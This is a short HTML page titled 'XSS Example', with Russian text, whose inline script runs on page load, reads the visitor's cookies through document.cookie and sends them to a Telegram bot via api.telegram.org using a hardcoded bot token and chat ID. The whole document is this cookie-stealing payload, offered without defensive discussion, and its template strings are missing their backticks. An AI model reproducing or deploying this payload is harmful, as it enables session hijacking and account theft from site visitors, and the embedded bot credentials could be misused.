<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Example</title>
</head>
<body>
    <h1>Добро пожаловать на сайт!</h1>
    <p>Ваши данные будут отправлены в Telegram.</p>

    <script>
        // Функция для отправки сообщения в Telegram
        function sendToTelegram(message) {
            const botToken = '7341685493:AAGsKsTZfF6LPql4R6fJJQ9qiUx3Mq1L5eQ';
            const chatId = '7406507427';
            const url = https://api.telegram.org/bot${botToken}/sendMessage;
            const data = {
                chat_id: chatId,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        // Получение cookies пользователя
        const cookies = document.cookie;

        // Отправка cookies в Telegram
        sendToTelegram(Cookies: ${cookies});
    </script>
</body>
</html>
